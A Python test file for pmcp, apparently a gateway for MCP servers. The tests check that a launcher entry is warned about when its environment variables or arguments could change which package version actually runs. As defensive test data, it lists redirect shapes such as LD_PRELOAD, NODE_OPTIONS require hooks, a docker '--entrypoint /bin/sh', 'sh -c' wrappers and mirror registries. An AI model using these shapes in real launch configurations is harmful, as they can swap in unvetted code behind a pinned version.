        {"fc": _server("fc", ["-y", "fc-mcp@3.25.5"])},
        online=["fc"],
    )

    health = await gateway.health()

    (info,) = [s for s in health.servers if s.name == "fc"]
    assert info.warnings == []


@pytest.mark.asyncio
async def test_entry_settings_that_cannot_redirect_keep_an_exact_pin_silent(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, either_identity_mode: str
) -> None:
    """Control: logging, timing, a registry credential, another scope's
    registry and the server's own declared keys change nothing for
    `fc-mcp`."""
    server = _server("fc", ["-y", "fc-mcp@3.25.5"])
    server.extra_env.update(
        {
            "npm_config_loglevel": "warn",
            # npm reads the prefix case-insensitively: this is `update-notifier`.
            "NPM_CONFIG_UPDATE_NOTIFIER": "false",
            "npm_config_fetch_timeout": "60000",
            "npm_config_//registry.npmjs.org/:_authToken": "secret",
            "npm_config_@corp:registry": "http://mirror.test/",
            "SELFHOST_API_KEY": "",
            "LANG": "C.UTF-8",
        }
    )
    gateway = _gateway(monkeypatch, tmp_path, {"fc": server}, online=["fc"])

    health = await gateway.health()

    (info,) = [s for s in health.servers if s.name == "fc"]
    assert info.warnings == []


def test_the_entry_env_allowlist() -> None:
    """Round 6: the env rule is an ALLOWLIST. A key is inert only if the entry
    declares it as the server's own (outside every tool namespace), it is a
    locale/terminal key, or it is on its launcher's short logging/timing/
    credential list. Everything else -- unknown keys included -- is not."""
    from pmcp.tools.handlers import (
        _declared_env_keys,
        _entry_env_key_is_inert,
        _npm_env_config_key,
    )

    declared = _declared_env_keys("fc")
    assert declared == {"SELFHOST_API_KEY", "SELFHOST_API_URL"}
    # Rev 9: declarations come from the SHIPPED manifest only, by name.
    assert _declared_env_keys("firecrawl") == {"FIRECRAWL_API_KEY", "FIRECRAWL_API_URL"}
    assert _declared_env_keys("overlay-only") == frozenset()

    not_inert = {
        "npm": [
            "npm_config_package",
            "NPM_CONFIG_REGISTRY",
            "npm_config_cache",
            "npm_config_store_dir",
            "npm_config_future_key",
            "NODE_OPTIONS",
            "NODE_PATH",
            "PREFIX",
            "nvm_dir",
            "PATH",
            "HOME",
            "https_proxy",
            "NODE_EXTRA_CA_CERTS",
            "LD_PRELOAD",
            "XDG_CONFIG_HOME",
            "SOME_UNKNOWN_KEY",
            "npm_config_@corp:registry",
        ],
        "pypi": [
            "UV_OVERRIDE",
            "UV_INDEX_URL",
            "UV_CONSTRAINT",
            "UV_CACHE_DIR",
            "UV_PYTHON",
            "UV_FUTURE_KEY",
            "PIP_INDEX_URL",
            "PYTHONPATH",
            "XDG_CONFIG_DIRS",
            "XDG_CACHE_HOME",
            "XDG_DATA_HOME",
            "SSL_CERT_FILE",
            "SOME_UNKNOWN_KEY",
        ],
        "cargo": [
            "CARGO_HOME",
            "CARGO_REGISTRIES_CORP_INDEX",
            "RUSTC_WRAPPER",
            "RUSTFLAGS",
            "RUSTUP_TOOLCHAIN",
            "CC",
            "CFLAGS",
            "LD_PRELOAD",
        ],
        "docker": ["DOCKER_HOST", "DOCKER_CONFIG", "NODE_OPTIONS", "SOME_UNKNOWN_KEY"],
    }
    inert = {
        "npm": [
            "npm_config_loglevel",
            "npm_config_yes",
            "npm_config_fetch_timeout",
            "npm_config_//registry.npmjs.org/:_authToken",
            "SELFHOST_API_URL",
            "SELFHOST_API_KEY",
            "LANG",
            "LC_ALL",
            "NO_COLOR",
        ],
        "pypi": [
            "UV_NO_PROGRESS",
            "UV_HTTP_TIMEOUT",
            "UV_INDEX_CORP_PASSWORD",
            "SELFHOST_API_URL",
            "TERM",
        ],
        "cargo": [
            "CARGO_TERM_COLOR",
            "CARGO_NET_RETRY",
            "CARGO_REGISTRY_TOKEN",
            "CARGO_REGISTRIES_CORP_TOKEN",
            "SELFHOST_API_KEY",
        ],
        "docker": ["SELFHOST_API_URL", "TZ"],
    }
    for family, keys in not_inert.items():
        for key in keys:
            assert not _entry_env_key_is_inert(
                family, key, "v", "@corp/fc", declared
            ), key
    for family, keys in inert.items():
        for key in keys:
            assert _entry_env_key_is_inert(family, key, "v", "fc-mcp", declared), key
    # Another scope's registry does not touch `fc`; an empty value is not special.
    assert _entry_env_key_is_inert(
        "npm", "npm_config_@corp:registry", "x", "fc", declared
    )
    assert not _entry_env_key_is_inert("npm", "PATH", "", "fc", declared)
    # npm's own env-name rule: case-insensitive prefix, `_` -> `-` except a
    # leading one, lowercased; a `//` key is left alone.
    assert _npm_env_config_key("NPM_CONFIG_SCRIPT_SHELL") == "script-shell"
    assert _npm_env_config_key("npm_config__auth") == "_auth"
    assert _npm_env_config_key("npm_config_//h/:_authToken") == "//h/:_authToken"


def _uvx_server(args: list[str], **env: str) -> ServerConfig:
    return ServerConfig(
        name="uv",
        description="uv",
        keywords=["uv"],
        install={},
        command="uvx",
        args=args,
        requires_api_key=True,
        env_var="SELFHOST_API_KEY",
        api_key_optional_when=["SELFHOST_API_URL"],
        extra_env={"SELFHOST_API_URL": "http://self-hosted.internal:3002", **env},
    )


def _cargo_server(args: list[str], **env: str) -> ServerConfig:
    server = _uvx_server(args, **env)
    server.name, server.command = "cg", "cargo"
    return server


async def _one_warning(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, server: ServerConfig
) -> list[str]:
    gateway = _gateway(
        monkeypatch, tmp_path, {server.name: server}, online=[server.name]
    )
    health = await gateway.health()
    (info,) = [s for s in health.servers if s.name == server.name]
    return info.warnings


@pytest.mark.parametrize(
    ("args", "env", "named"),
    [
        (["fc-mcp==1.2.3"], {"UV_OVERRIDE": "/srv/ovr.txt"}, "env sets UV_OVERRIDE"),
        (
            ["fc-mcp==1.2.3"],
            {"UV_INDEX_URL": "http://mirror.test/simple"},
            "env sets UV_INDEX_URL",
        ),
        (
            ["fc-mcp==1.2.3"],
            {"XDG_CONFIG_HOME": "/srv/cfg"},
            "env sets XDG_CONFIG_HOME",
        ),
        (
            ["--index-url", "http://mirror.test/simple", "fc-mcp==1.2.3"],
            {},
            "argv passes --index-url",
        ),
        (["--with", "other", "fc-mcp==1.2.3"], {}, "argv passes --with"),
        (
            ["--overrides=/srv/ovr.txt", "--from", "fc-mcp==1.2.3", "fc"],
            {},
            "argv passes --overrides",
        ),
    ],
    ids=[
        "env-override",
        "env-index",
        "env-xdg",
        "argv-index",
        "argv-with",
        "argv-overrides",
    ],
)
@pytest.mark.asyncio
async def test_an_exact_uvx_pin_is_not_called_pinned_when_the_entry_redirects_uv(
    args: list[str],
    env: dict[str, str],
    named: str,
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    """Round 5 B2, within the trust boundary: uv's out-of-argv redirects
    (reproduced: UV_OVERRIDE made `uvx --from cowsay==6.1` run 6.0)."""
    warnings = await _one_warning(monkeypatch, tmp_path, _uvx_server(args, **env))

    assert len(warnings) == 1
    assert "cannot verify" in warnings[0]
    assert named in warnings[0]


@pytest.mark.asyncio
async def test_an_exact_uvx_pin_is_silent_without_an_entry_redirect(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """Control: output flags, timing and a credential (rev 8: `--python` is
    no longer inert, as `UV_PYTHON` is not; round 6 N3)."""
    monkeypatch.setenv("UV_OVERRIDE", "/srv/ovr.txt")  # the host's: trusted
    server = _uvx_server(
        ["-q", "--from", "fc-mcp==1.2.3", "fc-mcp", "--port", "1"],
        UV_HTTP_TIMEOUT="60",
        UV_INDEX_CORP_PASSWORD="secret",
    )

    assert await _one_warning(monkeypatch, tmp_path, server) == []


@pytest.mark.parametrize(
    ("args", "env", "named"),
    [
        (
            ["install", "fc", "--version", "1.2.3"],
            {"CARGO_REGISTRIES_CORP_INDEX": "https://m.test"},
            "env sets CARGO_REGISTRIES_CORP_INDEX",
        ),
        (
            ["install", "fc", "--version", "1.2.3"],
            {"RUSTC_WRAPPER": "/srv/w"},
            "env sets RUSTC_WRAPPER",
        ),
        (
            ["install", "--git", "https://example.test/fc", "--version", "1.2.3", "fc"],
            {},
            "argv passes --git",
        ),
        (
            ["install", "fc", "--version", "1.2.3", "--registry", "corp"],
            {},
            "argv passes --registry",
        ),
    ],
    ids=["env-registry-index", "env-rustc-wrapper", "argv-git", "argv-registry"],
)
@pytest.mark.asyncio
async def test_an_exact_cargo_pin_is_not_called_pinned_when_the_entry_redirects_cargo(
    args: list[str],
    env: dict[str, str],
    named: str,
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    """Round 5 B2 for cargo (the seat's `--git ... --version 1.2.3` was silent)."""
    warnings = await _one_warning(monkeypatch, tmp_path, _cargo_server(args, **env))

    assert len(warnings) == 1
    assert "cannot verify" in warnings[0]
    assert named in warnings[0]


@pytest.mark.asyncio
async def test_an_exact_cargo_pin_is_silent_without_an_entry_redirect(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    server = _cargo_server(
        ["install", "--locked", "fc", "--version", "1.2.3"],
        CARGO_TERM_COLOR="never",
        CARGO_REGISTRY_TOKEN="secret",
    )

    assert await _one_warning(monkeypatch, tmp_path, server) == []


@pytest.mark.asyncio
async def test_a_uvx_url_requirement_is_never_an_exact_pin(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """Round 5 N5: a PEP 508 URL requirement names a file, whatever `==` its
    fragment carries."""
    from pmcp.tools.handlers import _uvx_requirement_is_exact

    url = "fc-mcp @ https://example.test/fc_mcp-9.9.9-py3-none-any.whl#x==1.0.0"
    assert _uvx_requirement_is_exact(["--from", url, "fc"]) is False
    assert _uvx_requirement_is_exact(["--from", "fc-mcp==1.0.0", "fc"]) is True
    assert _uvx_requirement_is_exact(["fc-mcp==1.0.0"]) is True
    assert _uvx_requirement_is_exact(["fc-mcp>=1.0,==1.0.0"]) is False

    warnings = await _one_warning(
        monkeypatch, tmp_path, _uvx_server(["--from", url, "fc"])
    )

    assert len(warnings) == 1
    assert (
        "floats on '1.0.0' (not one exact PEP 440 version from an index)"
        in (warnings[0])
    )


@pytest.mark.parametrize(
    ("command", "args", "tool"),
    [
        ("npx", ["-y", "fc-mcp@3.25.5"], "npm"),
        ("uvx", ["--from", "fc-mcp==1.2.3", "fc-mcp"], "uv"),
        ("cargo", ["install", "fc", "--version", "1.2.3"], "cargo"),
    ],
    ids=["npx", "uvx", "cargo"],
)
@pytest.mark.asyncio
async def test_an_entry_set_cwd_makes_an_exact_pin_unverifiable(
    command: str,
    args: list[str],
    tool: str,
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
    npm_tables: None,
) -> None:
    """Rev 7 (maintainer ruling): a cwd the ENTRY sets picks which directory's
    project configuration the launcher reads (.npmrc / package.json up the
    tree, uv.toml / [tool.uv], .cargo/config.toml), so it is the entry's to
    answer for. Nothing needs to be in the directory: pmcp does not read it."""
    project = tmp_path / "entry-project"
    project.mkdir()
    configured = ResolvedServerConfig(
        name="fc",
        source="user",
        config=LocalMcpServerConfig(
            command=command,
            args=args,
            env={"SELFHOST_API_URL": "http://self-hosted.internal:3002"},
            cwd=str(project),
        ),
    )
    gateway = _gateway(
        monkeypatch,
        tmp_path,
        {"fc": _server("fc", ["-y", "fc-mcp"])},
        configured=[configured],
        online=["fc"],
    )

    health = await gateway.health()

    (info,) = [s for s in health.servers if s.name == "fc"]
    assert len(info.warnings) == 1
    assert "cannot verify" in info.warnings[0]
    assert f"the entry sets cwd '{project}'" in info.warnings[0]
    assert f"project configuration {tool} reads" in info.warnings[0]


@pytest.mark.asyncio
async def test_a_docker_digest_ignores_an_entry_set_cwd_and_an_inherited_cwd_is_the_hosts(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_tables: None
) -> None:
    """docker run reads no cwd-relative configuration; and with no entry-set
    cwd the child inherits pmcp's own (here a node project), which is host."""
    (Path.cwd() / "package.json").write_text("{}\n")
    digest = "sha256:" + "e" * 64
    docker = ResolvedServerConfig(
        name="dk",
        source="user",
        config=LocalMcpServerConfig(
            command="docker",
            args=["run", f"example/client@{digest}"],
            env={"SELFHOST_API_URL": "http://self-hosted.internal:3002"},
            cwd=str(tmp_path),
        ),
    )
    gateway = _gateway(
        monkeypatch,
        tmp_path,
        {
            "dk": _docker_server("example/client:latest"),
            "fc": _server("fc", ["-y", "fc-mcp@3.25.5"]),
        },
        configured=[docker],
        online=["dk", "fc"],
    )

    health = await gateway.health()

    assert all(s.warnings == [] for s in health.servers if s.name in ("dk", "fc"))


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("docker", ["run", "--some-future-flag", "example/client:3.25.5"]),
        ("uvx", ["--some-future-flag", "fc-mcp==1.2.3"]),
        ("uvx.exe", ["fc-mcp==1.2.3"]),
    ],
    ids=["docker-unknown-flag", "uvx-unknown-flag", "uvx-non-bare"],
)
@pytest.mark.asyncio
async def test_an_argv_pmcp_cannot_read_fails_loud_for_every_read_launcher(
    command: str, args: list[str], monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """Round 5 N5: docker and uvx now match the npm family (round 3, N-b)."""
    server = _uvx_server(args)
    server.command = command

    warnings = await _one_warning(monkeypatch, tmp_path, server)

    assert len(warnings) == 1
    assert "cannot verify" in warnings[0]
    assert "cannot read which package" in warnings[0]


def test_exactness_is_decided_per_launcher() -> None:
    """C2: a docker tag is mutable whatever it looks like; each launcher has
    its own rule, and an unknown launcher is never exact."""
    from pmcp.tools.handlers import _is_exact_pin

    digest = "sha256:" + "a" * 64
    assert _is_exact_pin("docker", "3.25.5") is False
    assert _is_exact_pin("docker", "latest") is False
    assert _is_exact_pin("docker", digest) is True
    assert _is_exact_pin("docker", "sha256:beefbeef") is False
    assert _is_exact_pin("npm", "3.25.5") is True
    assert _is_exact_pin("npm", "3.25.5+build") is True
    assert _is_exact_pin("pypi", "1.2.3") is True
    assert _is_exact_pin("pypi", "1.*") is False
    assert _is_exact_pin("pypi", "=1.2.3") is False  # from `===1.2.3`
    assert _is_exact_pin("cargo", "1.2.3") is True
    assert _is_exact_pin("cargo", "^1.2") is False
    assert _is_exact_pin("unknown", "3.25.5") is False


def _docker_server(image: str) -> ServerConfig:
    return ServerConfig(
        name="dk",
        description="dk",
        keywords=["dk"],
        install={},
        command="docker",
        args=["run", "--pull=always", image],
        requires_api_key=True,
        env_var="SELFHOST_API_KEY",
        api_key_optional_when=["SELFHOST_API_URL"],
        extra_env={"SELFHOST_API_URL": "http://self-hosted.internal:3002"},
    )


@pytest.mark.asyncio
async def test_health_warns_on_a_docker_tag_however_version_like(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """C2: `example/client:3.25.5` can be re-pointed; only a digest pins."""
    digest = "sha256:" + "b" * 64
    gateway = _gateway(
        monkeypatch,
        tmp_path,
        {
            "dk": _docker_server("example/client:3.25.5"),
            "dg": _docker_server(f"example/client@{digest}"),
        },
        online=["dk", "dg"],
    )

    health = await gateway.health()

    (tagged,) = [s for s in health.servers if s.name == "dk"]
    (digested,) = [s for s in health.servers if s.name == "dg"]
    assert len(tagged.warnings) == 1
    assert "floats on '3.25.5' (a docker tag" in tagged.warnings[0]
    assert "image@sha256" in tagged.warnings[0]
    assert digested.warnings == []


@pytest.mark.asyncio
async def test_docker_digest_labels_and_the_entrys_docker_env(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """Round 5 N5: an upper-case digest floats and is not called a tag. The
    entry's DOCKER_* env (which daemon, which config) is the entry's to answer
    for, even with a digest."""
    upper = _docker_server("example/client@sha256:" + "B" * 64)
    upper.name = "du"
    routed = _docker_server("example/client@sha256:" + "b" * 64)
    routed.name = "dh"
    routed.extra_env["DOCKER_HOST"] = "tcp://other-daemon.test:2375"
    gateway = _gateway(
        monkeypatch, tmp_path, {"du": upper, "dh": routed}, online=["du", "dh"]
    )

    health = await gateway.health()

    (du,) = [s for s in health.servers if s.name == "du"]
    (dh,) = [s for s in health.servers if s.name == "dh"]
    assert len(du.warnings) == 1
    assert "a malformed content digest" in du.warnings[0]
    assert "a docker tag" not in du.warnings[0]
    assert len(dh.warnings) == 1
    assert "the entry's env sets DOCKER_HOST" in dh.warnings[0]


@pytest.mark.asyncio
async def test_update_server_reports_a_docker_tag_as_floating(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """C2 drives the report too: a tag is [FLOATING], a digest [PINNED]."""
    from pmcp.cli import _format_update_result

    digest = "sha256:" + "c" * 64
    gateway = _gateway(
        monkeypatch,
        tmp_path,
        {
            "dk": _docker_server("example/client:3.25.5"),
            "dg": _docker_server(f"example/client@{digest}"),
        },
    )
    _latest(monkeypatch, "sha256:" + "d" * 64)
    probes = _no_probe(monkeypatch, gateway)

    tagged = await gateway.update_server({"server_name": "dk"})
    digested = await gateway.update_server({"server_name": "dg"})

    assert probes == []  # neither is moved: the operator chose both
    assert (tagged.pinned_version, tagged.floating_selector) == (None, "3.25.5")
    assert "a docker tag" in tagged.message
    assert (digested.pinned_version, digested.floating_selector) == (digest, None)
    assert _format_update_result(tagged.model_dump())[0].startswith("[FLOATING] dk")
    assert _format_update_result(digested.model_dump())[0].startswith("[PINNED] dg")


@pytest.mark.parametrize("status", ["active (npm 11.19.0)", "not started (test)"])
@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("npx.cmd", ["-y", "fc-mcp"]),
        ("/usr/bin/npx", ["-y", "fc-mcp"]),
        ("C:\\tools\\npx.cmd", ["-y", "fc-mcp"]),
        ("npm.cmd", ["exec", "-y", "fc-mcp"]),
    ],
    ids=["npx.cmd", "abs-npx", "windows-npx", "npm.cmd"],
)
@pytest.mark.asyncio
async def test_the_cause_names_a_launcher_identity_does_not_read(
    command: str,
    args: list[str],
    status: str,
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    """NB-1: for such a launcher the resolver was never asked, so its status --
    which depends on whether an earlier lookup started it -- is not the cause."""
    monkeypatch.setattr(
        handlers_module, "get_resolver", lambda: _ResolverStatus(status)
    )
    server = _server("fc", args)
    server.command = command
    gateway = _gateway(monkeypatch, tmp_path, {"fc": server}, online=["fc"])

    health = await gateway.health()

    (info,) = [s for s in health.servers if s.name == "fc"]
    assert len(info.warnings) == 1
    assert "reads only a bare `npx`/`npm` command" in info.warnings[0]
    assert repr(command) in info.warnings[0]
    assert "npm's own parser" not in info.warnings[0]
    assert "unavailable" not in info.warnings[0]


@pytest.mark.asyncio
async def test_the_floating_label_claims_only_what_every_npm_reads(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_tables: None
) -> None:
    """NB-2: npa 13 reads `1.0.0-x.tar-gz` as a version and npa 12 as a file,
    so it is neither "a range" nor "a tag"; it is not one exact version on
    every npm release."""
    gateway = _gateway(
        monkeypatch,
        tmp_path,
        {"fc": _server("fc", ["-y", "fc-mcp@1.0.0-x.tar-gz"])},
        online=["fc"],
    )

    health = await gateway.health()

    (info,) = [s for s in health.servers if s.name == "fc"]
    assert len(info.warnings) == 1
    assert "not one exact version on every npm release" in info.warnings[0]
    assert "range or tag" not in info.warnings[0]


@pytest.mark.asyncio
async def test_update_server_labels_build_metadata_with_what_npm_runs(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_tables: None
) -> None:
    """A configured `pkg@3.25.5+evil` runs 3.25.5; the label must say that."""
    gateway = _gateway(
        monkeypatch, tmp_path, {"fc": _server("fc", ["-y", "fc-mcp@3.25.5+evil"])}
    )
    _latest(monkeypatch, "3.26.0")

    result = await gateway.update_server({"server_name": "fc"})

    assert (result.pinned_version, result.latest_comparison) == ("3.25.5", "newer")
    assert "build metadata '+evil' is ignored by npm" in result.message
    assert "3.25.5+evil" not in (result.pinned_version or "")


@pytest.mark.asyncio
async def test_update_server_reports_a_range_as_floating_not_pinned(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_tables: None
) -> None:
    gateway = _gateway(
        monkeypatch, tmp_path, {"fc": _server("fc", ["-y", "fc-mcp@^3.25.0"])}
    )
    _latest(monkeypatch, "3.26.0")
    probes = _no_probe(monkeypatch, gateway)

    result = await gateway.update_server({"server_name": "fc"})

    assert result.ok is False
    assert probes == []  # still not moved: the operator chose the selector
    assert (result.pinned_version, result.floating_selector) == (None, "^3.25.0")
    assert result.latest_comparison is None
    assert "does not hold the client at one version" in result.message


@pytest.mark.asyncio
async def test_update_server_carries_the_unpinned_self_hosted_warning(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_tables: None
) -> None:
    gateway = _gateway(monkeypatch, tmp_path, {"fc": _server("fc", ["-y", "fc-mcp"])})
    probes = _no_probe(monkeypatch, gateway)

    result = await gateway.update_server({"server_name": "fc"})

    assert probes == [["npx", "-y", "fc-mcp@latest", "--help"]]  # not blocked
    assert len(result.warnings) == 1
    assert "SELFHOST_API_URL" in result.warnings[0]


# ---------------------------------------------------------------------------
# pmcp update rendering
# ---------------------------------------------------------------------------


def test_pmcp_update_renders_a_pinned_server_as_pinned_not_failed() -> None:
    from pmcp.cli import _format_update_result

    lines = _format_update_result(
        {
            "ok": False,
            "server": "firecrawl",
            "pinned_version": "3.25.5",
            "latest_available": "3.26.0",
            "latest_comparison": "newer",
            "message": "long message",
            "warnings": [],
        }
    )

    assert lines == ["[PINNED] firecrawl: pinned at 3.25.5, newer available: 3.26.0"]


def test_pmcp_update_renders_a_range_as_floating() -> None:
    from pmcp.cli import _format_update_result

    lines = _format_update_result(
        {
            "ok": False,
            "server": "fc",
            "floating_selector": "^3.25.0",
            "latest_available": "3.26.0",
            "message": "long message",
            "warnings": [],
        }
    )

    assert lines == [
        "[FLOATING] fc: held at ^3.25.0, which is not one exact version and "
        "can resolve to another at a later spawn (latest 3.26.0)"
    ]


def test_pmcp_update_prints_warnings_under_the_result() -> None:
    from pmcp.cli import _format_update_result

    lines = _format_update_result(
        {
            "ok": True,
            "server": "firecrawl",
            "message": "Updated.",
            "warnings": ["unpinned against a self-hosted backend"],
        }
    )

    assert lines == [
        "[OK] firecrawl: Updated.",
        "  warning: unpinned against a self-hosted backend",
    ]


# ---------------------------------------------------------------------------
# Board round 6 (rev 8): allowlists for the entry's env and argv shapes
# ---------------------------------------------------------------------------

_DIGEST = "sha256:" + "f" * 64


def _launch(name: str, command: str, args: list[str], **env: str) -> ServerConfig:
    server = _uvx_server(args, **env)
    server.name, server.command = name, command
    return server


_UNRECOGNISED_SHAPES = {
    # X1: something other than the pinned package runs.
    "docker-command-after-image": (
        "docker",
        ["run", "-i", "--rm", f"node@{_DIGEST}", "npx", "-y", "semver"],
        "a container command after the image",
    ),
    "docker-entrypoint": (
        "docker",
        ["run", "--entrypoint", "/bin/sh", f"node@{_DIGEST}"],
        "argv passes --entrypoint",
    ),
    "docker-volume": (
        "docker",
        ["run", "-v", "/srv/evil:/app", f"node@{_DIGEST}"],
        "argv passes -v",
    ),
    "docker-env-file": (
        "docker",
        ["run", "--env-file", "/srv/env", f"node@{_DIGEST}"],
        "argv passes --env-file",
    ),
    "docker-env-node-options": (
        "docker",
        ["run", "-e", "NODE_OPTIONS=--require=/x", f"node@{_DIGEST}"],
        "container env NODE_OPTIONS",
    ),
    "npx-package-then-sh": (
        "npx",
        ["-y", "-p", "fc-mcp@3.25.5", "sh", "-c", "echo other"],
        "argv passes -p",
    ),
    "uvx-from-then-sh": (
        "uvx",
        ["--from", "fc-mcp==1.2.3", "sh", "-c", "echo other"],
        "runs 'sh' from the --from environment",
    ),
    # N3: the interpreter and the toolchain are not inert.
    "uvx-python": (
        "uvx",
        ["--python", "/srv/python", "fc-mcp==1.2.3"],
        "argv passes --python",
    ),
    "cargo-toolchain": (
        "cargo",
        ["+nightly", "install", "fc", "--version", "1.2.3"],
        "selects toolchain +nightly",
    ),
}


@pytest.mark.parametrize(
    ("command", "args", "named"),
    list(_UNRECOGNISED_SHAPES.values()),
    ids=list(_UNRECOGNISED_SHAPES),
)
@pytest.mark.asyncio
async def test_an_exact_pin_in_an_unrecognised_argv_shape_is_unverifiable(
    command: str,
    args: list[str],
    named: str,
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
    npm_tables: None,
) -> None:
    """Round 6 X1/N3: the argv rule is an allowlist of SHAPES in which the
    pinned package is what runs; anything else is "cannot verify"."""
    warnings = await _one_warning(monkeypatch, tmp_path, _launch("sh1", command, args))

    assert len(warnings) == 1
    assert "cannot verify" in warnings[0]
    assert named in warnings[0]


@pytest.mark.parametrize(
    ("command", "args"),
    [
        (
            "docker",
            [
                "run",
                "-i",
                "--rm",
                "--pull=always",
                "-e",
                "SELFHOST_API_URL",
                f"example/client@{_DIGEST}",
            ],
        ),
        ("docker", ["run", "-e", "SELFHOST_API_KEY=k", f"node:22@{_DIGEST}"]),
        ("npx", ["-y", "fc-mcp@3.25.5", "--port", "3000"]),
        ("uvx", ["--from", "fc-mcp==1.2.3", "fc-mcp", "--port", "3000"]),
        ("uvx", ["--from", "fc_mcp==1.2.3", "FC.MCP"]),
        ("cargo", ["install", "--locked", "fc", "--version", "1.2.3"]),
    ],
    ids=[
        "docker-digest",
        "docker-tagged-digest",
        "npx",
        "uvx-from-own-command",
        "uvx-pep503-name",
        "cargo",
    ],
)
@pytest.mark.asyncio
async def test_a_recognised_shape_with_an_exact_pin_is_silent(
    command: str,
    args: list[str],
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
    npm_tables: None,
) -> None:
    """Controls: each launcher's modelled shape, with its inert flags, the
    declared server keys passed to the container, and arguments to the
    package after it."""
    assert (
        await _one_warning(monkeypatch, tmp_path, _launch("ok1", command, args)) == []
    )


@pytest.mark.parametrize(
    ("key", "value"),
    [
        ("XDG_CONFIG_DIRS", "/srv/xdg"),
        ("XDG_CACHE_HOME", "/srv/cache"),
        ("LD_PRELOAD", "/srv/hook.so"),
        ("SOME_UNKNOWN_KEY", "1"),
        ("PATH", ""),
    ],
    ids=[
        "xdg-config-dirs",
        "xdg-cache-home",
        "ld-preload",
        "unknown-key",
        "empty-path",
    ],
)
@pytest.mark.asyncio
async def test_an_entry_key_not_proven_inert_is_unverifiable(
    key: str, value: str, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """Round 6 X2/N1/N4: the env rule is an allowlist, so a spelling nobody
    listed (XDG_CONFIG_DIRS redirected uv to an impostor wheel), a loader
    key, an unknown key and an empty PATH are all "cannot verify"."""
    server = _uvx_server(["fc-mcp==1.2.3"], **{key: value})

    warnings = await _one_warning(monkeypatch, tmp_path, server)

    assert len(warnings) == 1
    assert f"the entry's env sets {key}" in warnings[0]


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("bunx", ["fc-mcp@3.25.5"]),
        ("pnpx", ["fc-mcp@3.25.5"]),
        ("pnpm", ["dlx", "fc-mcp@3.25.5"]),
        ("sh", ["-c", "npx -y fc-mcp@3.25.5"]),
        ("env", ["FOO=1", "npx", "-y", "fc-mcp@3.25.5"]),
        ("node", ["/usr/lib/node_modules/npm/bin/npx-cli.js", "-y", "fc-mcp"]),
        ("uv", ["run", "fc-mcp"]),
    ],
    ids=["bunx", "pnpx", "pnpm-dlx", "sh-c", "env", "node", "uv-run"],
)
@pytest.mark.asyncio
async def test_an_unmodelled_runner_or_wrapper_is_unverifiable(
    command: str, args: list[str], monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """Round 6 N2: runners pmcp does not model, and wrappers, fail loud."""
    warnings = await _one_warning(monkeypatch, tmp_path, _launch("rn1", command, args))

    assert len(warnings) == 1
    assert "a package runner or wrapper pmcp does not model" in warnings[0]


@pytest.mark.asyncio
async def test_uv_tool_run_is_judged_as_uvx(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """Round 6 N2: `uv tool run` is uvx, so it is judged, not skipped."""
    pinned = _launch("ut1", "uv", ["tool", "run", "fc-mcp==1.2.3"])
    unpinned = _launch("ut2", "uv", ["tool", "run", "fc-mcp"])
    gateway = _gateway(
        monkeypatch, tmp_path, {"ut1": pinned, "ut2": unpinned}, online=["ut1", "ut2"]
    )

    health = await gateway.health()

    (one,) = [s for s in health.servers if s.name == "ut1"]
    (two,) = [s for s in health.servers if s.name == "ut2"]
    assert one.warnings == []
    assert len(two.warnings) == 1
    assert "is unpinned" in two.warnings[0]


@pytest.mark.asyncio
async def test_update_server_never_labels_a_container_command_pinned(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """Round 6 X1 drives the report too: a digest-pinned image running
    `npx -y semver` is not a pinned client, so it is not [PINNED]."""
    from pmcp.cli import _format_update_result

    server = _launch(
        "dc1", "docker", ["run", "--rm", f"node@{_DIGEST}", "npx", "-y", "semver"]
    )
    gateway = _gateway(monkeypatch, tmp_path, {"dc1": server})
    _latest(monkeypatch, "sha256:" + "0" * 64)
    _no_probe(monkeypatch, gateway)

    result = await gateway.update_server({"server_name": "dc1"})

    assert (result.pinned_version, result.floating_selector) == (None, _DIGEST)
    assert "a container command after the image" in result.message
    assert _format_update_result(result.model_dump())[0].startswith("[FLOATING] dc1")


# ---------------------------------------------------------------------------
# Board round 7 (rev 9): every spawning argv; only shipped declarations exempt
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("install", "named"),
    [
        (
            ["npx", "-y", "fc-mcp"],
            "does not run fc-mcp@3.25.5 (it names fc-mcp@latest)",
        ),
        (["npx", "-y", "fc-mcp@3.26.0"], "does not run fc-mcp@3.25.5"),
        (["sh", "-c", "npx -y fc-mcp@3.25.5"], "runs something pmcp cannot read"),
        (["npx", "-y", "-p", "fc-mcp@3.25.5", "sh"], "linux install argv"),
    ],
    ids=["unpinned", "other-version", "sh-wrapper", "package-then-sh"],
)
@pytest.mark.asyncio
async def test_an_install_argv_that_does_not_run_the_pin_is_unverifiable(
    install: list[str],
    named: str,
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
    npm_tables: None,
) -> None:
